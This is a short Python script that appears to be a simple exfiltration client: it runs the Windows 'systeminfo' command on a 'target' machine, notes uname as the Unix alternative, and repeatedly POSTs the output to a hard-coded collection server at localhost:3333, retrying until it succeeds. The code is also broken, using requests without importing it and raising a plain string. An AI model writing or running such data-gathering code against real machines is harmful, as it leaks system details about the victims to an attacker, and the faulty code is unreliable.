from flask import Flask , request
import os
import time


url = "http://localhost:3333"

data = {"info": os.popen("systeminfo").read()}
# use uname if the target os is unix 


def main():
	try:
		res = requests.post(url=url,json=data)
		if res.status_code != 200:
			raise "not ok"
	except:
		time.sleep(3)
		main()

if __name__ == "__main__":
	main()
